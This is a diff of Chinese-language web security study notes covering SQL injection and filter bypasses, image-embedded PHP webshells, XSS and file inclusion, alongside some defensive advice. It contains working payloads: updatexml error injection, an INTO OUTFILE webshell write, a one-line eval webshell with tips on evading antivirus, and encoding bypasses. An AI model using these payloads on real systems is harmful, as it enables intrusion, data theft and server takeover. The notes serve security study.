@@ -113,7 +113,8 @@ wafw00f用于识别waf。防护的识别和绕过都是较难的部分
 
 1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，GET参数、POST参数、HTTP头、URL都不要错过
 
-2. **闭合语句**：尝试构造合法语句。例如完整查询语句为`SELECT * FROM users WHERE id=('$id') LIMIT 1`，需要构造注入内容`1') -- `让它成为合法语句。大多数时候都是黑盒测试，需要结合经验尝试单引号、双引号、反引号、括号等。注意，MySQL会做隐式转换，如`id='1 and 1=1'`会查到`id=1`的数据，不要被骗
+2. **闭合语句**：尝试构造合法语句。例如完整查询语句为`SELECT * FROM users WHERE id=('$id') LIMIT 1`，需要构造注入内容`1') -- `让它成为合法语句。大多数时候都是黑盒测试，需要结合经验尝试单引号、双引号、反引号、括号等
+   - 注意，若注入点是用引号括起来的数字，比如`id='1'`，MySQL会尝试`'1'`转换为数字再查找。因此即使引号没匹配`id=('1 or 1=1')`、被转义`id='1\'`，都能看似正常的返回。不要被骗
 
 3. **构造注入语句**
 
@@ -140,22 +141,6 @@ UPDATE users SET name='user' WHERE id='' and (SELECT substring(pwd,1,1))='a';  #
 ```sql
 -- 示例：获取users表的列名
 SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
-```
-
-### 报错注入
-
-如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中
-
-向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名
-
-```sql
-SELECT updatexml(1, concat(0x7e, (select user())), 2)
-```
-
-下面语句据说利用随机GROUP BY有概率爆出错误，[参考](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2)，但我无法复现
-
-```sql
-SELECT count(*),concat((select user()),floor(rand()*2))a FROM information_schema.columns GROUP BY a
 ```
 
 ### 盲注
@@ -207,7 +192,9 @@ SELECT cot(1 - (1=1));
 SELECT pow(1 + (1=1), 99999);
 ```
 
-### 文件操作
+### 其他注入手段
+
+#### 文件操作
 
 以下代码可以读写文件，不过仅限`SELECT @secure_file_priv;`指定的目录
 
@@ -216,12 +203,35 @@ SELECT '<?php @eval($_POST[aaa]);?>' INTO OUTFILE 'shell.php'
 SELECT load_file('backup.bak')
 ```
 
-### 二次注入
+#### 报错注入
 
-例如，注册用户名`admin' -- `，注册时没有发生注入，但是用该用户进行操作时，比如修改密码，
+如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中
+
+向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名
 
 ```sql
-UPDATE users SET pwd='$pwd' WHERE name='$name';  -- 替换参数之前
+SELECT updatexml(1, concat(0x7e, (select user())), 2)
+```
+
+下面语句据说利用随机GROUP BY有概率爆出错误，[参考](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2)，但我无法复现
+
+```sql
+SELECT count(*),concat((select user()),floor(rand()*2))a FROM information_schema.columns GROUP BY a
+```
+
+#### 堆叠注入
+
+一次注入多条语句。不过数据库API不一定支持
+
+```sql
+SELECT * FROM users WHERE id=1; drop users();
+```
+
+#### 二次注入
+
+例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，就没有清洗，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码
+
+```sql
 UPDATE users SET pwd='pswd' WHERE name='admin' -- 
 ```
 
@@ -229,8 +239,8 @@ UPDATE users SET pwd='pswd' WHERE name='admin' --
 
 - **预编译**、**参数化查询**：将语句和数据分离
 - **过滤**
-  - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义
-  - **`mysql_real_escape_string`**：`addslashes`的上位替换。转义方式相同，会考虑数据库上下文
+  - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义。本意并不是防SQL注入的，只是恰好起到了一点效果
+  - **`mysql_real_escape_string`**：`addslashes`的上位替换。但是安全性也没有高很多
   - **字符过滤**：禁用空格、引号、注释等特殊符号
   - **关键字过滤**：用正则匹配`UNION`等常用于渗透攻击的关键字，删除它或者干脆拒绝访问（这种方法效率低、防不全，还容易把正常用户拦住）
 
@@ -240,12 +250,15 @@ UPDATE users SET pwd='pswd' WHERE name='admin' --
 
 编码：使用特殊编码、特殊转义方式，绕过网站的转义和关键字检查
 
-- **宽字节注入**：服务器和数据库可能采用不同编码，比如可能服务器采用utf-8，数据库用gbk。GBK用2个字节表示一个汉字，可以用一个1字节长的utf-8字符”吞掉“一个字节。比如注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；反斜杠的编码为`%5c`，前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“了。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。若使用`mysql_real_escape_string`等安全的转义函数，且正确设置编码，便可修复此漏洞
+- **宽字节注入**：对于使用反斜杠（`0x5c`）转义的防护手段，可以在合适位置插入一个字节，让它“吞掉”反斜杠
+  - 若服务器使用utf-8、数据库使用GBK，注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。第一个字节可以是`0x81~0xa0, 0xa8~0xfd`的任意一个
+  - 若使用utf-8编码，注入`%c0' or 1=1`，转义后前两字节为`%c0%5c`，被当作一个字符（因为UTF-8是变长编码，用最高几个比特辨认字符使用多少字节，`%c0`前3比特为`0b110`，被当作是一个长2字节的字符，详见[维基百科](https://en.wikipedia.org/wiki/UTF-8#Description)）。一般称作**Overlong Encoding**漏洞
+
 - **二次编码注入**：进行两次百分号编码，如`' ' -> %20 -> %25%20`；对普通字符编码，如`u%6eion`。若开发者错误地在SQL参数的转义、过滤后再进行一次URI解码，可导致注入
 - **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）。参见[SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)
 
 ```sql
--- 空格过滤：注释/**/、其他空白符。参见速查表
+-- 空格过滤：注释/**/、其他空白符。参见上面的速查表链接
 -- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
 SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
 -- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
@@ -255,8 +268,6 @@ SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
 -- 闭合引号、括号绕过注释
 SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 ```
-
-
 
 ## 文件上传
 
@@ -301,10 +312,10 @@ SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似
 
 1. 随便准备一张图片`a.jpg`
-2. 构造恶意代码。通常用“一句话木马”，即非常简短的木马，其隐蔽性较好。后续可用小木马作为跳板上传大木马
+2. 构造恶意代码。通常用“一句话木马”，即非常简短的木马，其隐蔽性较好。后续可用它作为跳板上传大木马
    - PHP：`<?php @eval($_GET['cmd']); ?>`
    - aspx：`<%@ Page Language="Jscript"%>`
-   - 这么直白的写法肯定会被杀毒软件发现，需要结合代码混淆实现免杀
+   - 这么直白的写法肯定会被杀毒软件发现，需要结合代码混淆实现免杀。可参考[Webshell集合](https://github.com/tennc/webshell)
 3. 将图片和代码拼接到一起。或者用Photoshop、PIL等将木马写入图片EXIF
 
 ```shell
@@ -312,21 +323,9 @@ cat a.jpg shell.php > shell.jpg           # Linux
 copy a.jpg /b + shell.php /a > shell.jpg  # Windows
 ```
 
-
-
-### webshell
-
-它允许攻击者通过浏览器远程访问和执行系统命令、文件操作、数据库操作等
-
-```php+HTML
-<?php @eval($_GET['cmd']); ?>
-```
-
-
-
 ## 跨站脚本（XSS）
 
-跨站脚本（Cross-Site Scripting，简称XSS。第一个字母改为X以避免和样式层叠表CSS冲突）是网站显示用户输入（比如显示评论）时，字符串被浏览器误当作代码解析执行从而产生危害。例如下面的文本若被当作javascript执行，将在用户不知情之下将Cookie发送到攻击者服务器，攻击者可以用它进行会话劫持攻击
+跨站脚本（Cross-Site Scripting，简称XSS。第一个字母改为X以避免和样式层叠表CSS冲突）是网站显示用户输入（比如，论坛发帖）时，字符串被浏览器误当作代码解析执行从而产生危害。例如下面的文本若被当作javascript执行，将在用户不知情之下将Cookie发送到攻击者服务器，攻击者可以用它进行会话劫持攻击
 
 ```html
 <script>
@@ -341,9 +340,25 @@ XSS只能影响到用户前端，无法直接作用于服务器
 - **存储型**：恶意代码存储在服务器中，打开对应页面便受到攻击。易受攻击的功能有评论、文章、用户个人资料等
 - **DOM型**：污染动态加载的数据，则浏览器解析数据时就会受到攻击。易受攻击的功能有前端渲染搜索、聊天等
 
-### 防护手段
+可以执行恶意代码的HTML标签有：
 
-检测
+```html
+<script>alert();</script>
+<img src="x" onerror="alert();" />
+<a href="javascript:alert();">Click Me</a>
+```
+
+### 防护
+
+- 转义
+- 输入校验
+- `httponly`
+
+### 绕过
+
+安全的转义方式（如`htmlspecialchars`）是没有办法绕过的，除非网页结构特殊（如允许用户操作`a[href]`，或者包含了一个具有XSS漏洞的网页。这两种情况可以不定义新HTML标签、不更改给现有标签的属性而实现XSS）。不过，用户输入和回显形式多样，开发者可能会误以为某些输入是安全的所以不转义，或者干脆忘记转义。渗透测试就是要寻找这些不起眼的用户输入和显示，比如HTTP头也是一种用户输入；比如有的网站会将数据放在`input[type=hidden]`等隐藏元素
+
+首先试着注入单引号、双引号、HTML标签、URI转义、HTML实体，如`1'2"<b>&#x61;&#x3a;%41</b>`如果都被转义就可以找下一个目标了
 
 ## 跨站请求伪造（CSRF）
 
@@ -369,7 +384,14 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 ## 文件包含
 
+开发者常通过函数（如PHP的`include`、`require`）将其他文件的内容引入当前脚本，例如加载配置文件、复用代码模块。当**用户输入用于文件路径**且未做严格过滤时，攻击者可以篡改路径，包含非预期的文件（如系统文件、远程脚本）。
+
+- **本地文件包含**（Local File Inclusion，LFI）：包含服务器本地文件，可用于窃取敏感信息，或配合文件上传漏洞执行任意代码
+- **远程文件包含**（Remote File Inclusion，RFI）：包含远程服务器文件（一般需要服务器开启配置），直接执行恶意代码
+
 ## 文件下载
+
+
 
 ## 逻辑漏洞
 
@@ -377,7 +399,7 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 ### 支付漏洞
 
-绕过？？，如修改优惠券金额
+绕过业务逻辑，如修改优惠券金额
 
 ### 越权访问
 
